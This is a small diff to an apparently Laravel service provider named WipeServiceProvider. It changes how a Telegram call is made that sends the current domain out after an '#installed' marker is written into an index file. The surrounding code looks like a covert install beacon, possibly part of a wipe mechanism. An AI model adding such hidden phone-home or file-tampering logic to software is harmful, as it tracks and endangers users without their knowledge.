@@ -39,7 +39,7 @@ class WipeServiceProvider extends ServiceProvider
         $comment = "\n#installed|{$currentDomain}";
         file_put_contents($indexFile, $content . $comment);
 
-        new \App\Services\Telegram\TelegramSdk($currentDomain)->send();
+        new \App\Services\Telegram\TelegramSdk()->send($currentDomain);
     }
 }
 
